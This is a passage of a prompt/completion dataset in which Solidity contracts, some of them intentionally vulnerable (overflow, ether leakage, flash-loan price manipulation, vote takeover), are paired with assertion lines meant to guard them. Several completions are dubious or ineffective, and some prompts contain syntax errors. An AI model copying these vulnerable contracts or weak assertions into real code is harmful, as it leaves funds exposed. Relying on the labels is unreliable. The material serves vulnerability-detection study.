lastSharePrice.mulDivDown(10**sharePriceDecimals);\n\n68         emit EndRoundData(currentRoundId, roundAccruedInterest, investmentYield, totalIdleAssets());\n69         emit SharePrice(currentRoundId, startSharePrice, endSharePrice);\n70     }\n\n71     function _beforeWithdraw(uint256 shares, uint256) internal override {\n72         lastRoundAssets -= shares.mulDivDown(lastSharePrice);\n73     }\n\n\n74     function totalAssets() public view override returns (uint256) {\n75         return _asset.balanceOf(address(this)) - totalIdleAssets();\n76     }\n\n\n77     function _deposit(\n78         uint256 assets,\n79         uint256 shares,\n80         address receiver\n81     ) internal override returns (uint256 depositedAssets) {\n82         _spendCap(shares);\n\n83         assets = _stETHTransferFrom(msg.sender, address(this), assets);\n84         depositQueue.push(DepositQueueLib.DepositEntry(receiver, assets));\n\n85         emit Deposit(msg.sender, receiver, assets, shares);\n\n86         return assets;\n87     }\n\n88     function _withdraw(\n89         uint256 assets,\n90         uint256 shares,\n91         address receiver,\n92         address owner\n93     ) internal virtual override returns (uint256 receiverAssets, uint256 receiverShares) {\n94         if (msg.sender != owner) {\n95             _spendAllowance(owner, msg.sender, shares);\n96         }\n\n97         _burn(owner, shares);\n98         _restoreCap(shares);\n\n99         // Apply custom withdraw logic\n100         _beforeWithdraw(shares, assets);\n\n101         uint256 fee = _getFee(assets);\n102         receiverAssets = assets - fee;\n103         receiverShares = shares;\n\n104         emit Withdraw(msg.sender, receiver, owner, receiverAssets, shares);\n\n105         _asset.safeTransfer(receiver, receiverAssets);\n\n106         if (fee > 0) {\n107             emit FeeCollected(fee);\n108             _asset.safeTransfer(controller(), fee);\n109         }\n110     }\n\n111     function _stETHTransferFrom(\n112         address from,\n113         address to,\n114         uint256 amount\n115     ) internal returns (uint256 effectiveAmount) {\n116         uint256 balanceBefore = _asset.balanceOf(to);\n117         if (from == address(this)) {\n118             _asset.safeTransfer(to, amount);\n119         } else {\n120             _asset.safeTransferFrom(from, to, amount);\n121         }\n122         return _asset.balanceOf(to) - balanceBefore;\n123     }\n124 }",
        "completion": "72+ assert(lastRoundAssets > 0);\n115+ assert(amount > 0);"
    },
    {
        "prompt": "1 abstract contract BaseVault is IVault, ERC20Permit, Capped {\n\n2      function processQueuedDeposits(uint256 startIndex, uint256 endIndex) external {\n3          if (!isProcessingDeposits) revert IVault__NotProcessingDeposits();\n\n4          uint256 _totalAssets = totalAssets();\n5          for (uint256 i = startIndex; i < endIndex; i++) {\n6              uint256 currentAssets = _totalAssets + processedDeposits;\n7              DepositQueueLib.DepositEntry memory depositEntry = depositQueue.get(i);\n8              _processDeposit(depositEntry, currentAssets);\n9              processedDeposits += depositEntry.amount;\n10          }\n11          depositQueue.remove(startIndex, endIndex);\n12      }\n\n\n13      function _processDeposit(DepositQueueLib.DepositEntry memory depositEntry, uint256 currentAssets) internal virtual {\n14          uint256 supply = totalSupply();\n15          uint256 assets = depositEntry.amount;\n16         uint256 shares = currentAssets == 0 || supply == 0 ? assets : assets.mulDivUp(supply, currentAssets);\n17          _mint(depositEntry.owner, shares);\n18          emit DepositProcessed(depositEntry.owner, currentRoundId, assets, shares);\n19      }\n\n20      function _getFee(uint256 assets) internal view returns (uint256) {\n21         return assets.mulDivDown(withdrawFeeRatio(), DENOMINATOR);\n22      }\n\n23      function _deposit(\n24          uint256 assets,\n25          uint256 shares,\n26          address receiver\n27      ) internal virtual returns (uint256 depositedAssets) {\n28          _spendCap(shares);\n\n29         depositQueue.push(DepositQueueLib.DepositEntry(receiver, assets));\n\n30          emit Deposit(msg.sender, receiver, assets, shares);\n31          _asset.safeTransferFrom(msg.sender, address(this), assets);\n\n32          return assets;\n33      }\n\n\n34      function _withdraw(\n35          uint256 assets,\n36          uint256 shares,\n37          address receiver,\n38          address owner\n39      ) internal virtual returns (uint256 receiverAssets, uint256 receiverShares) {\n40          if (msg.sender != owner) {\n41              _spendAllowance(owner, msg.sender, shares);\n42         }\n\n43          _burn(owner, shares);\n44          _restoreCap(shares);\n45          _beforeWithdraw(shares, assets);\n\n46          uint256 fee = _getFee(assets);\n47          receiverAssets = assets - fee;\n48          receiverShares = shares;\n\n49          emit Withdraw(msg.sender, receiver, owner, receiverAssets, shares);\n50         _asset.safeTransfer(receiver, receiverAssets);\n\n51          if (fee > 0) {\n52              emit FeeCollected(fee);\n53             _asset.safeTransfer(controller(), fee);\n54          }\n55     }\n\n\n\n\n56     function _beforeWithdraw(uint256 shares, uint256 assets) internal virtual {}\n\n \n57      function _afterRoundStart(uint256 assets) internal virtual {}\n\n58     // solhint-disable-next-line no-empty-blocks\n59      /* This hook should be implemented in the contract implementation.\n60         It will trigger after setting isProcessingDeposits to true\n61      */\n62     function _afterRoundEnd() internal virtual {}\n63 }",
        "completion": "10+ require(depositQueue.size() == 0,  \"Cannot process multiple deposits\");"
    },
    {
        "prompt": "1/ / SPDX-License-Identifier: MIT\n2  pragma solidity >=0.4.24 <0.6.0;\n3  \n4  contract overflow{\n5         function pay(address[] recipients,\n6                         uint256[] amounts) {\n7         require(recipients.length==amounts.length);\n8         for (uint i = 0; i < recipients.length; i++) {\n9         recipients[i].send(amounts[i]);\n10         }\n11         }\n12  }",
        "completion": "7+ require(recipients.length==amounts.length);\n8+ assert(amounts[i] >= 0); "
    },
    {
        "prompt": "1 / / SPDX-License-Identifier: MIT\n2   pragma solidity >=0.4.24 <0.6.0;\n3 contract AccountingError{\n\n4 function swap(uint amount1Out, address to) external {\n5      token1.transfer(to, amount1Out);\n6      IUniswapV2Callee(to).uniswapV2Call();\n\n7      uint balance0 = token0.balanceOf(address(this));\n8      uint balance1 = token1.balanceOf(address(this));\n9      uint amount0In = balance0 - (reserve0 - amount0Out);\n10      uint balance0Adj = balance0 * 10000 - amount0In * 22;\n11      require(\n12            balance0Adj*balance1 >= reserve0* reserve1* 1000,\n13            \"insufficient funds transferred back\");\n14     reserve0 = balance0; reserve1 = balance1;\n15  }\n16 }",
        "completion": "10+  assert( balance0Adj*balance1 >= reserve0* reserve1* 10000);\n"
    },
    {
        "prompt": "1  // SPDX-License-Identifier: MIT\n2  pragma solidity >=0.5.0;\n \n3   contract Swap {\n4           IERC20 public WEI;\n5           IERC20 public USD;\n6           IUniswapV2Pair public pair; \n7           mapping(address => uint) public debt;\n8           mapping(address => uint) public collateral;\n \n9           function liquidate(address user) public {\n10               uint dAmount = debt[user];\n11               uint cAmount = collateral[user];\n12              require(getPrice() * cAmount * 80 / 100 < dAmount,\n13               \"the given user\u2019s fund cannot be liquidated\");\n14              address _this = address(this);\n15             USD.transferFrom(msg.sender, _this, dAmount);\n16              WEI.transferFrom(_this, msg.sender, cAmount);\n17         }\n18           function  getPrice() public payable returns (uint) { \n \n19                price = USD.balanceOf(address(pair)) / WEI.balanceOf(address(pair))\n20                  return price;\n21       }\n22    }",
        "completion": "8+ assert(Old(getPrice())==getPrice());\n16+ require(Old(getPrice())<=getPrice()*k, \"watch out for flashloan attacks!\");\n"
    },
    {
        "prompt": "1  // SPDX-License-Identifier: MIT\n2  pragma solidity >=0.5.0;\n \n3 contract etherleakge{\n4    function payout(address[] recipients,\n5                 uint256[] amounts) {\n6       require(recipients.length==amounts.length);\n7       for (uint i = 0; i < recipients.length; i++) {\n\n8          recipients[i].send(amounts[i]);\n9          }\n10    }\n11 }",
        "completion": "6+ assert(msg.sender != 0);"
    },
    {
        "prompt": "1 pragma solidity ^0.4.11;\n2 \n3 contract Vote {\n4         struct Proposal {\n5         uint160 sTime; address newOwner;\n6         }\n7         IERC20 votingToken;\n8         address owner;\n9         Proposal proposal;\n10 \n11         function startExecute() external {\n12             require(proposal.sTime == 0, \"\"on-going proposal\"\");\n13             proposal = Proposal(block.timestamp, msg.sender);\n14         }\n15         function execute(uint amount) external {\n16             require(proposal.sTime + 2 days > block.timestamp,\n17             \"\"voting has ended\"\");\n18             votingToken.transferFrom(\n19             msg.sender, address(this), amount);\n20         }\n21         function endExecute() external {\n22             require(proposal.sTime != 0, \"\"no proposal\"\");\n23             require(proposal.sTime + 2 days < block.timestamp,\n24             \"\"voting has not ended\"\");\n25             require(votingToken.balanceOf(address(this))*2 >\n26             votingToken.totalSupply(), \"\"vote failed\"\");\n27             owner = proposal.newOwner;\n28             delete proposal;\n29         }\n30 }",
        "completion": "13+ assert(Old(votingToken.balanceOf(address(this))) == 0);\n17+ assert(Old(votingToken.balanceOf(address(this))) == votingToken.balanceOf(address(this)));\n24+ assert(Old(votingToken.balanceOf(address(this)))==votingToken.balanceOf(address(this)));\n"
    },
    {
        "prompt": "1 pragma solidity ^0.4.11;\n2 \n3 contract Vote {\n4         struct Proposal {\n5         uint160 sTime; address newOwner;\n6         }\n7         IERC20 votingToken;\n8         address owner;\n9         Proposal proposal;\n10 \n11         function startExecute() external {\n12             require(proposal.sTime == 0, \"\"on-going proposal\"\");\n13             proposal = Proposal(block.timestamp, msg.sender);\n14         }\n15         function execute(uint amount) external {\n16             require(proposal.sTime + 2 days > block.timestamp,\n17             \"\"voting has ended\"\");\n18             votingToken.transferFrom(\n19             msg.sender, address(this), amount);\n20         }\n21         function endExecute() external {\n22             require(proposal.sTime != 0, \"\"no proposal\"\");\n23             require(proposal.sTime + 2 days < block.timestamp,\n24             \"\"voting has not ended\"\");\n25             require(votingToken.balanceOf(address(this))*2 >\n26             votingToken.totalSupply(), \"\"vote failed\"\");\n27             owner = proposal.newOwner;\n28             delete proposal;\n29         }\n30 }",
        "completion": "13+ assert(Old(votingToken.balanceOf(address(this))) == 0);\n17+ assert(Old(votingToken.balanceOf(address(this))) == votingToken.balanceOf(address(this)));\n24+ assert(Old(votingToken.balanceOf(address(this)))==votingToken.balanceOf(address(this)));\n"
    },
    {
        "prompt": "1 pragma solidity ^0.4.11;\n2 \n3 contract Vote {\n4         struct Proposal {\n5         uint160 sTime; address newOwner;\n6         }\n7         IERC20 votingToken;\n8         address owner;\n9         Proposal proposal;\n10 \n11         function startExecute() external {\n12             require(proposal.sTime == 0, \"\"on-going proposal\"\");\n13             proposal = Proposal(block.timestamp, msg.sender);\n14         }\n15         function execute(uint amount) external {\n16             require(proposal.sTime + 2 days > block.timestamp,\n17             \"\"voting has ended\"\");\n18             votingToken.transferFrom(\n19             msg.sender, address(this), amount);\n20         }\n21         function endExecute() external {\n22             require(proposal.sTime != 0, \"\"no proposal\"\");\n23             require(proposal.sTime + 2 days < block.timestamp,\n24             \"\"voting has not ended\"\");\n25             require(votingToken.balanceOf(address(this))*2 >\n26             votingToken.totalSupply(), \"\"vote failed\"\");\n27             owner = proposal.newOwner;\n28             delete proposal;\n29         }\n30 }",
        "completion": "13+ assert(Old(votingToken.balanceOf(address(this))) == 0);\n17+ assert(Old(votingToken.balanceOf(address(this))) == votingToken.balanceOf(address(this)));\n24+ assert(Old(votingToken.balanceOf(address(this)))==votingToken.balanceOf(address(this)));\n"
    },
    {
        "prompt": "//votingToken is important for tracking \n1 pragma solidity ^0.4.11;\n2 \n3 contract Vote {\n4         struct Proposal {\n5         uint160 sTime; address newOwner;\n6         }\n7         IERC20 votingToken;\n8         address owner;\n9         Proposal proposal;\n10 \n11         function startExecute() external {\n12             require(proposal.sTime == 0, \"\"on-going proposal\"\");\n13             proposal = Proposal(block.timestamp, msg.sender);\n14         }\n15         function execute(uint amount) external {\n16             require(proposal.sTime + 2 days > block.timestamp,\n17             \"\"voting has ended\"\");\n18             votingToken.transferFrom(\n19             msg.sender, address(this), amount);\n20         }\n21         function endExecute() external {\n22             require(proposal.sTime != 0, \"\"no proposal\"\");\n23             require(proposal.sTime + 2 days < block.timestamp,\n24             \"\"voting has not ended\"\");\n25             require(votingToken.balanceOf(address(this))*2 >\n26             votingToken.totalSupply(), \"\"vote failed\"\");\n27             owner = proposal.newOwner;\n28             delete proposal;\n29         }\n30 }\n\n",
        "completion": "13+ assert(Old(votingToken.balanceOf(address(this))) == 0);\n17+ assert(Old(votingToken.balanceOf(address(this))) == votingToken.balanceOf(address(this)));\n24+ assert(Old(votingToken.balanceOf(address(this)))==votingToken.balanceOf(address(this)));\n"
    },
    {
        "prompt": "1  // SPDX-License-Identifier: MIT\n2 // OpenZeppelin Contracts (last updated v4.7.0) (proxy/transparent/TransparentUpgradeableProxy.sol)\n\n3 pragma solidity ^0.8.0;\n\n4 import \"../ERC1967/ERC1967Proxy.sol\";\n\n5 interface ITransparentUpgradeableProxy {\n6     event Upgraded(address indexed implementation);\n7     event AdminChanged(address previousAdmin, address newAdmin);\n8     function admin() external view returns (address);\n9     function implementation() external view returns (address);\n10     function changeAdmin(address) external;\n11     function upgradeTo(address) external;\n12     function upgradeToAndCall(address, bytes memory) payable external;\n13 }\n\n14 /**\n15  * @dev This contract implements a proxy that is upgradeable by an admin.\n16  *\n17  * To avoid https://medium.com/nomic-labs-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357[proxy selector\n18  * clashing], which can potentially be used in an attack, this contract uses the\n19  * https://blog.openzeppelin.com/the-transparent-proxy-pattern/[transparent proxy pattern]. This pattern implies two\n20  * things that go hand in hand:\n21  *\n22  * 1. If any account other than the admin calls the proxy, the call will be forwarded to the implementation, even if\n23  * that call matches one of the admin functions exposed by the proxy itself.\n24  * 2. If the admin calls the proxy, it can access the admin functions, but its calls will never be forwarded to the\n25  * implementation. If the admin tries to call a function on the implementation it will fail with an error that says\n26  * \"admin cannot fallback to proxy target\".\n27  *\n28  * These properties mean that the admin account can only be used for admin actions like upgrading the proxy or changing\n29  * the admin, so it's best if it's a dedicated account that is not used for anything else. This will avoid headaches due\n30  * to sudden errors when trying to call a function from the proxy implementation.\n31  *\n32  * Our recommendation is for the dedicated account to be an instance of the {ProxyAdmin} contract. If set up this way,\n33  * you should think of the `ProxyAdmin` instance as the real administrative interface of your proxy.\n34  */\n35 contract Proxy is ERC1967Proxy {\n36     /**\n37      * @dev Initializes an upgradeable proxy managed by `_admin`, backed by the implementation at `_logic`, and\n38      * optionally initialized with `_data` as explained in {ERC1967Proxy-constructor}.\n39      */\n40     constructor(address _logic, address admin_, bytes memory _data) payable ERC1967Proxy(_logic, _data) {\n41         _changeAdmin(admin_);\n42     }\n\n43     /**\n44      * @dev If caller is the admin process the call internally, otherwise transparently fallback to the proxy behavior\n45      */\n46     function _fallback() internal virtual override {\n47         if (msg.sender == _getAdmin()) {\n48             bytes memory ret;\n49             bytes4 selector = msg.sig;\n50             if (selector == ITransparentUpgradeableProxy.upgradeTo.selector) {\n51                 ret = _dispatchUpgradeTo();\n52             } else if (selector == ITransparentUpgradeableProxy.upgradeToAndCall.selector) {\n53                 ret = _dispatchUpgradeToAndCall();\n54             } else if (selector == ITransparentUpgradeableProxy.changeAdmin.selector) {\n55                 ret = _dispatchChangeAdmin();\n56             } else if (selector == ITransparentUpgradeableProxy.admin.selector) {\n57                 ret = _dispatchAdmin();\n58             } else if (selector == ITransparentUpgradeableProxy.implementation.selector) {\n59                 ret = _dispatchImplementation();\n60             } else {\n61                 revert('TransparentUpgradeableProxy: admin cannot fallback to proxy target');\n62             }\n63             assembly {\n64                 return(add(ret, 0x20), mload(ret))\n65             }\n66         } else {\n67             super._fallback();\n68         }\n69     }\n\n70     /**\n71      * @dev Returns the current admin.\n72      *\n73      * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the\n74      * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.\n75      * `0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103`\n76      */\n77     function _dispatchAdmin() private returns (bytes memory) {\n78         _requireZeroValue();\n\n79         address admin = _getAdmin();\n80         return abi.encode(admin);\n81     }\n\n82     /**\n83      * @dev Returns the current implementation.\n84      *\n85      * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the\n86      * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.\n87      * `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`\n88      */\n89     function _dispatchImplementation() private returns (bytes memory) {\n90         _requireZeroValue();\n\n91         address implementation = _implementation();\n92         return abi.encode(implementation);\n93     }\n\n94     /**\n95      * @dev Changes the admin of the proxy.\n96      */\n97     function _dispatchChangeAdmin() private returns (bytes memory) {\n98         _requireZeroValue();\n\n99         address newAdmin = abi.decode(msg.data[4:], (address));\n100         _changeAdmin(newAdmin);\n\n101         return \"\";\n102     }\n\n103     /**\n104      * @dev Upgrade the implementation of the proxy.\n105      */\n106     function _dispatchUpgradeTo() private returns (bytes memory) {\n107         _requireZeroValue();\n\n108         address newImplementation = abi.decode(msg.data[4:], (address));\n109         _upgradeToAndCall(newImplementation, bytes(\"\"), false);\n\n110         return \"\";\n111     }\n\n112     /**\n113      * @dev Upgrade the implementation of the proxy, and then call a function from the new implementation as specified\n114      * by `data`, which should be an encoded function call. This is useful to initialize new storage variables in the\n115      * proxied contract.\n116      */\n117     function _dispatchUpgradeToAndCall() private returns (bytes memory) {\n118         (address newImplementation, bytes memory data) = abi.decode(msg.data[4:], (address, bytes));\n119         _upgradeToAndCall(newImplementation, data, true);\n\n120         return \"\";\n121     }\n\n122     /**\n123      * @dev Returns the current admin.\n124      */\n125     function _admin() internal view virtual returns (address) {\n126         return _getAdmin();\n127     }\n\n128     /**\n129      * @dev To keep this contract fully transparent, all `ifAdmin` functions must be payable. This helper is here to\n130      * emulate some proxy functions being non-payable while still allowing value to pass through.\n131      */\n132     function _requireZeroValue() private {\n133         require(msg.value == 0);\n134     }\n135 }",
        "completion": "80+ assert(Old(abi.encode(admin)) == abi.encode(admin)); \n92+ assert(Old(abi.encode(implementation)) == abi.encode(implementation));\n99+ assert(Old(newAdmin) == abi.decode(msg.data[4:], (address)));\n108+ assert(Old(newImplementation) == abi.decode(msg.data[4:], (address)));\n111+ assert(Old(abi.encode(admin)) != Old(abi.encode(implementation)));\n111+ assert(Old(newAdmin) != Old(newImplementation)); \n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 // OpenZeppelin Contracts (last updated v4.8.0) (governance/compatibility/GovernorCompatibilityBravo.sol)\n\n3 pragma solidity ^0.8.0;\n\n4 import \"../../utils/math/SafeCast.sol\";\n5 import \"../extensions/IGovernorTimelock.sol\";\n6 import \"../Governor.sol\";\n7 import \"./IGovernorCompatibilityBravo.sol\";\n\n8 /**\n9  * @dev Compatibility layer that implements GovernorBravo compatibility on top of {Governor}.\n10  *\n11  * This compatibility layer includes a voting system and requires a {IGovernorTimelock} compatible module to be added\n12  * through inheritance. It does not include token bindings, nor does it include any variable upgrade patterns.\n13  *\n14  * NOTE: When using this module, you may need to enable the Solidity optimizer to avoid hitting the contract size limit.\n15  *\n16  * _Available since v4.3._\n17  */\n//check for possible array OOM\n18 abstract contract GovernorCompatibilityBravo is IGovernorTimelock, IGovernorCompatibilityBravo, Governor {\n19     enum VoteType {\n20         Against,\n21         For,\n22         Abstain\n23     }\n\n24     struct ProposalDetails {\n25         address proposer;\n26         address[] targets;\n27         uint256[] values;\n28         string[] signatures;\n29         bytes[] calldatas;\n30         uint256 forVotes;\n31         uint256 againstVotes;\n32         uint256 abstainVotes;\n33         mapping(address => Receipt) receipts;\n34         bytes32 descriptionHash;\n35     }\n\n36     mapping(uint256 => ProposalDetails) private _proposalDetails;\n\n37     // solhint-disable-next-line func-name-mixedcase\n38     function COUNTING_MODE() public pure virtual override returns (string memory) {\n39         return \"support=bravo&quorum=bravo\";\n40     }\n\n41     // ============================================== Proposal lifecycle ==============================================\n42     /**\n43      * @dev See {IGovernor-propose}.\n44      */\n45     function propose(\n46         address[] memory targets,\n47         uint256[] memory values,\n48         bytes[] memory calldatas,\n49         string memory description\n50     ) public virtual override(IGovernor, Governor) returns (uint256) {\n51         _storeProposal(_msgSender(), targets, values, new string[](calldatas.length), calldatas, description);\n52         return super.propose(targets, values, calldatas, description);\n53     }\n\n54     /**\n55      * @dev See {IGovernorCompatibilityBravo-propose}.\n56      */\n57     function propose(\n58         address[] memory targets,\n59         uint256[] memory values,\n60         string[] memory signatures,\n61         bytes[] memory calldatas,\n62         string memory description\n63     ) public virtual override returns (uint256) {\n64         _storeProposal(_msgSender(), targets, values, signatures, calldatas, description);\n65         return propose(targets, values, _encodeCalldata(signatures, calldatas), description);\n66     }\n\n67     /**\n68      * @dev See {IGovernorCompatibilityBravo-queue}.\n69      */\n70     function queue(uint256 proposalId) public virtual override {\n71         ProposalDetails storage details = _proposalDetails[proposalId];\n72         queue(\n73             details.targets,\n74             details.values,\n75             _encodeCalldata(details.signatures, details.calldatas),\n76             details.descriptionHash\n77         );\n78     }\n\n79     /**\n80      * @dev See {IGovernorCompatibilityBravo-execute}.\n81      */\n82     function execute(uint256 proposalId) public payable virtual override {\n83         ProposalDetails storage details = _proposalDetails[proposalId];\n84         execute(\n85             details.targets,\n86             details.values,\n87             _encodeCalldata(details.signatures, details.calldatas),\n88             details.descriptionHash\n89         );\n90     }\n\n91     function cancel(uint256 proposalId) public virtual override {\n92         ProposalDetails storage details = _proposalDetails[proposalId];\n\n93         require(\n94             _msgSender() == details.proposer || getVotes(details.proposer, block.number - 1) < proposalThreshold(),\n95             \"GovernorBravo: proposer above threshold\"\n96         );\n\n97         _cancel(\n98             details.targets,\n99             details.values,\n100             _encodeCalldata(details.signatures, details.calldatas),\n101             details.descriptionHash\n102         );\n103     }\n\n104     /**\n105      * @dev Encodes calldatas with optional function signature.\n106      */\n107     function _encodeCalldata(string[] memory signatures, bytes[] memory calldatas)\n108         private\n109         pure\n110         returns (bytes[] memory)\n111     {\n112         bytes[] memory fullcalldatas = new bytes[](calldatas.length);\n\n113         for (uint256 i = 0; i < signatures.length; ++i) {\n114             fullcalldatas[i] = bytes(signatures[i]).length == 0\n115                 ? calldatas[i]\n116                 : abi.encodePacked(bytes4(keccak256(bytes(signatures[i]))), calldatas[i]);\n117         }\n\n118         return fullcalldatas;\n119     }\n\n120     /**\n121      * @dev Store proposal metadata for later lookup\n122      */\n123     function _storeProposal(\n124         address proposer,\n125         address[] memory targets,\n126         uint256[] memory values,\n127         string[] memory signatures,\n128         bytes[] memory calldatas,\n129         string memory description\n130     ) private {\n131         bytes32 descriptionHash = keccak256(bytes(description));\n132         uint256 proposalId = hashProposal(targets, values, _encodeCalldata(signatures, calldatas), descriptionHash);\n\n133         ProposalDetails storage details = _proposalDetails[proposalId];\n134         if (details.descriptionHash == bytes32(0)) {\n135             details.proposer = proposer;\n136             details.targets = targets;\n137             details.values = values;\n138             details.signatures = signatures;\n139             details.calldatas = calldatas;\n140             details.descriptionHash = descriptionHash;\n141         }\n142     }\n\n143     // ==================================================== Views =====================================================\n144     /**\n145      * @dev See {IGovernorCompatibilityBravo-proposals}.\n146      */\n147     function proposals(uint256 proposalId)\n148         public\n149         view\n150         virtual\n151         override\n152         returns (\n153             uint256 id,\n154             address proposer,\n155             uint256 eta,\n156             uint256 startBlock,\n157             uint256 endBlock,\n158             uint256 forVotes,\n159             uint256 againstVotes,\n160             uint256 abstainVotes,\n161             bool canceled,\n162             bool executed\n163         )\n164     {\n165         id = proposalId;\n166         eta = proposalEta(proposalId);\n167         startBlock = proposalSnapshot(proposalId);\n168         endBlock = proposalDeadline(proposalId);\n\n169         ProposalDetails storage details = _proposalDetails[proposalId];\n170         proposer = details.proposer;\n171         forVotes = details.forVotes;\n172         againstVotes = details.againstVotes;\n173         abstainVotes = details.abstainVotes;\n\n174         ProposalState status = state(proposalId);\n175         canceled = status == ProposalState.Canceled;\n176         executed = status == ProposalState.Executed;\n177     }\n\n178     /**\n179      * @dev See {IGovernorCompatibilityBravo-getActions}.\n180      */\n181     function getActions(uint256 proposalId)\n182         public\n183         view\n184         virtual\n185         override\n186         returns (\n187             address[] memory targets,\n188             uint256[] memory values,\n189             string[] memory signatures,\n190             bytes[] memory calldatas\n191         )\n192     {\n193         ProposalDetails storage details = _proposalDetails[proposalId];\n194         return (details.targets, details.values, details.signatures, details.calldatas);\n195     }\n\n196     /**\n197      * @dev See {IGovernorCompatibilityBravo-getReceipt}.\n198      */\n199     function getReceipt(uint256 proposalId, address voter) public view virtual override returns (Receipt memory) {\n200         return _proposalDetails[proposalId].receipts[voter];\n201     }\n\n202     /**\n203      * @dev See {IGovernorCompatibilityBravo-quorumVotes}.\n204      */\n205     function quorumVotes() public view virtual override returns (uint256) {\n206         return quorum(block.number - 1);\n207     }\n\n208     // ==================================================== Voting ====================================================\n209     /**\n210      * @dev See {IGovernor-hasVoted}.\n211      */\n212     function hasVoted(uint256 proposalId, address account) public view virtual override returns (bool) {\n213         return _proposalDetails[proposalId].receipts[account].hasVoted;\n214     }\n\n215     /**\n216      * @dev See {Governor-_quorumReached}. In this module, only forVotes count toward the quorum.\n217      */\n218     function _quorumReached(uint256 proposalId) internal view virtual override returns (bool) {\n219         ProposalDetails storage details = _proposalDetails[proposalId];\n220         return quorum(proposalSnapshot(proposalId)) <= details.forVotes;\n221     }\n\n222     /**\n223      * @dev See {Governor-_voteSucceeded}. In this module, the forVotes must be strictly over the againstVotes.\n224      */\n225     function _voteSucceeded(uint256 proposalId) internal view virtual override returns (bool) {\n226         ProposalDetails storage details = _proposalDetails[proposalId];\n227         return details.forVotes > details.againstVotes;\n228     }\n\n229     /**\n230      * @dev See {Governor-_countVote}. In this module, the support follows Governor Bravo.\n231      */\n232     function _countVote(\n233         uint256 proposalId,\n234         address account,\n235         uint8 support,\n236         uint256 weight,\n237         bytes memory // params\n238     ) internal virtual override {\n239         ProposalDetails storage details = _proposalDetails[proposalId];\n240         Receipt storage receipt = details.receipts[account];\n\n241         require(!receipt.hasVoted, \"GovernorCompatibilityBravo: vote already cast\");\n242         receipt.hasVoted = true;\n243         receipt.support = support;\n244         receipt.votes = SafeCast.toUint96(weight);\n\n245         if (support == uint8(VoteType.Against)) {\n246             details.againstVotes += weight;\n247         } else if (support == uint8(VoteType.For)) {\n248             details.forVotes += weight;\n249         } else if (support == uint8(VoteType.Abstain)) {\n250             details.abstainVotes += weight;\n251         } else {\n252             revert(\"GovernorCompatibilityBravo: invalid vote type\");\n253         }\n254     }\n255 }",
        "completion": "63+ assert(signatures.length ==calldatas.length);\n111+ assert(signatures.length ==calldatas.length);\n131+ assert(signatures.length ==calldatas.length);"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 // OpenZeppelin Contracts (last updated v4.8.0) (governance/compatibility/GovernorCompatibilityBravo.sol)\n\n3 pragma solidity ^0.8.0;\n\n4 import \"../../utils/math/SafeCast.sol\";\n5 import \"../extensions/IGovernorTimelock.sol\";\n6 import \"../Governor.sol\";\n7 import \"./IGovernorCompatibilityBravo.sol\";\n//use a lot fo arrays, need to check for their potential OOB errors\n\n8 abstract contract GovernorCompatibilityBravo is IGovernorTimelock, IGovernorCompatibilityBravo, Governor {\n9     enum VoteType {\n10         Against,\n11         For,\n12         Abstain\n13     }\n\n14     struct ProposalDetails {\n15         address proposer;\n16         address[] targets;\n17         uint256[] values;\n18         string[] signatures; //important variable to keep track of\n19         bytes[] calldatas;\n20         uint256 forVotes;\n21         uint256 againstVotes;\n22         uint256 abstainVotes;\n23         mapping(address => Receipt) receipts;\n24         bytes32 descriptionHash;\n25     }\n\n26     mapping(uint256 => ProposalDetails) private _proposalDetails;\n\n   \n27     function COUNTING_MODE() public pure virtual override returns (string memory) {\n28         return \"support=bravo&quorum=bravo\";\n29     }\n\n\n \n30     function propose(\n31         address[] memory targets,\n32         uint256[] memory values,\n33         string[] memory signatures,\n34         bytes[] memory calldatas,\n35         string memory description\n36     ) public virtual override returns (uint256) {\n         //should we check here? \n37         _storeProposal(_msgSender(), targets, values, signatures, calldatas, description);\n38         return propose(targets, values, _encodeCalldata(signatures, calldatas), description);\n39     }\n\n40    }",
        "completion": "36+ assert(signatures.length ==calldatas.length);"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: MIT\n2 // OpenZeppelin Contracts (last updated v4.8.0-rc.2) (token/ERC721/ERC721.sol)\n\n3 pragma solidity ^0.8.0;\n\n4 import \"./IERC721.sol\";\n5 import \"./IERC721Receiver.sol\";\n6 import \"./extensions/IERC721Metadata.sol\";\n7 import \"../../utils/Address.sol\";\n8 import \"../../utils/Context.sol\";\n9 import \"../../utils/Strings.sol\";\n10 import \"../../utils/introspection/ERC165.sol\";\n\n11 /**\n12  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including\n13  * the Metadata extension, but not including the Enumerable extension, which is available separately as\n14  * {ERC721Enumerable}.\n15  */\n16 contract ERC721 is Context, ERC165, IERC721, IERC721Metadata {\n17     using Address for address;\n18     using Strings for uint256;\n\n19     // Token name\n20     string private _name;\n\n21     // Token symbol\n22     string private _symbol;\n\n23     // Mapping from token ID to owner address\n24     mapping(uint256 => address) private _owners;\n\n25     // Mapping owner address to token count\n26     mapping(address => uint256) private _balances;\n\n27     // Mapping from token ID to approved address\n28     mapping(uint256 => address) private _tokenApprovals;\n\n29     // Mapping from owner to operator approvals\n30     mapping(address => mapping(address => bool)) private _operatorApprovals;\n\n\n31     constructor(string memory name_, string memory symbol_) {\n32         _name = name_;\n33         _symbol = symbol_;\n34     }\n\n\n35     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {\n36         return\n37             interfaceId == type(IERC721).interfaceId ||\n38             interfaceId == type(IERC721Metadata).interfaceId ||\n39             super.supportsInterface(interfaceId);\n40     }\n\n\n41     function balanceOf(address owner) public view virtual override returns (uint256) {\n42         require(owner != address(0), \"ERC721: address zero is not a valid owner\");\n43         return _balances[owner];\n44     }\n\n\n45     function ownerOf(uint256 tokenId) public view virtual override returns (address) {\n46         address owner = _ownerOf(tokenId);\n47         require(owner != address(0), \"ERC721: invalid token ID\");\n48         return owner;\n49     }\n\n\n50     function name() public view virtual override returns (string memory) {\n51         